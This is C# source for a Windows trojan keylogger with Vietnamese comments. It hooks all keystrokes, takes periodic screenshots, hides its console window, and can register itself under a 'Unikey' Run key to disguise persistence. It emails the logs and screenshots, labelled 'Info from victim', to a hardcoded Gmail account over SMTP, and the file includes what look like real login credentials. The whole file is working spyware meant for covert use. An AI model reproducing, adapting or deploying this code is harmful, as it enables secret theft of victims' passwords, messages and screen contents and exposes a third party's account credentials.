using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TrojanKeyLogger
{
    class Program
    {
        #region Bắt bàn phím
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        #endregion   
        #region Chụp ảnh màn hình
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0;
        static int captureTime = 5000;

        /// <summary>
        /// Capture al screen then save into ImagePath
        /// </summary>
        static void CaptureScreen()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            // Save the screenshot to the specified path that the user has chosen.
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {

            }
            imageCount++;
        }

        #endregion
        #region Timer
        static int interval = 1;
        static void StartTimmer()
        {
            Thread thread = new Thread(() => {
                while (true)
                {
                    Thread.Sleep(1);

                    if (interval % captureTime == 0)
                        CaptureScreen();

                    if (interval % mailTime == 0)                   
                        SendMail();                                                         
                    interval++;

                    if (interval >= 1000000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion
        #region Windows
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }
        #endregion
        #region Mail
        static int mailTime = 5000;
        static void SendMail()
        {
            string hostname= "";
            System.Net.IPHostEntry ip = new IPHostEntry();
            hostname = System.Net.Dns.GetHostName();
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("email@gmail.com");
                mail.To.Add("herobrine.chinaa@gmail.com");
                mail.Subject = "Trojan date: " + DateTime.Now.ToLongDateString();
                mail.Body = "Info from victim " + hostname+"\n";

                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);

                    mail.Body += sr.ReadToEnd();

                    sr.Close();
                }

                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                    {
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                       
                    }
                       
                }
               
                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("herobrine.chinaa@gmail.com", "0964440775");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");


                // phải làm cái này ở mail dùng để gửi phải bật lên
                // https://www.google.com/settings/u/1/security/lesssecureapps
               
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }

            RemoveFile();
        }
        #endregion
        #region Registry that open with window
        static void StartWithOS()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\Unikey");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("Unikey", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {
            }
        }
        #endregion
        #region RemoveFile
        static void RemoveFile ()
        {
            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
            DirectoryInfo image = new DirectoryInfo(directoryImage);
            foreach (FileInfo item in image.GetFiles("*.png"))
            {
                if (File.Exists(directoryImage + "\\" + item.Name))
                {             
                    try
                    {
                        File.Delete(directoryImage + "\\" + item.Name);
                    }
                    catch
                    {

                    }
                   
                }

            }
        }
        #endregion
        static void Main(string[] args)
        {

            //string path = "UniKeyNT.exe";
            //System.Diagnostics.Process.Start(path);
            //StartWithOS();//Chạy cùng windows
            HideWindow();//Ẩn 
            StartTimmer();//Chạy theo thời gian
            HookKeyboard();//Bắt sự kiện bàn phím
         

        }
    }
}
